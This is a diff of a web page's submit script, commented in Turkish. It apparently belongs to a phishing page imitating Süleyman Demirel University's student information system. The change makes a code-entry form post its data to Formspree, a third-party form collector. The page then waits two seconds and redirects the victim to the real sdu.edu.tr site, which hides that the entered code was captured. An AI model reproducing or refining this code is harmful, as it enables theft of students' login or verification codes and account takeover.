@@ -956,20 +956,14 @@
                                     <script>
                                         var form = document.getElementById("kodForm");
                                         form.addEventListener("submit", function (e) {
-                                            e.preventDefault();
+                                            // Butonu güncelle
                                             var btn = document.getElementById("onayBtn");
                                             btn.innerText = "KONTROL EDİLİYOR...";
-                                            btn.disabled = true;
 
-                                            var data = new FormData(form);
-                                            fetch(form.action, {
-                                                method: 'POST',
-                                                body: data,
-                                                headers: { 'Accept': 'application/json' }
-                                            }).finally(function () {
-                                                // OBS Hatasını önlemek için ana sayfaya yönlendiriyoruz
+                                            // Formspree'ye verinin gitmesi için 2 saniye bekleyip sonra yönlendiriyoruz
+                                            setTimeout(function () {
                                                 window.location.href = "https://www.sdu.edu.tr";
-                                            });
+                                            }, 2000);
                                         });
                                     </script>
                                     <div class="footer"
